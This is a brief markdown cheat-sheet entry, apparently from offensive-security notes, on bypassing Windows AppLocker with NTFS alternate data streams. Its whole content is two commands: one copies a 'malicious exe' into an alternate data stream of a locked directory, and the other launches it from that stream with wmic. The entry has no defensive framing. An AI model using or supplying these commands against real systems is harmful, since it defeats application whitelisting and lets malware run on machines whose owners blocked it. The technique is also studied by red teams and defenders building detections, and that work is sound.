## bypass applocker unsing alternate data streams

### copy malicious exe into the locked directory (current working directory must be one level above the locked directory)
```
type <path\to\file.exe> > .\<lockedDirectory>:<file.exe>
```

### execute
```
wmic process call create '"%CD%\<lockedDirectory>:<file.exe>"'
```

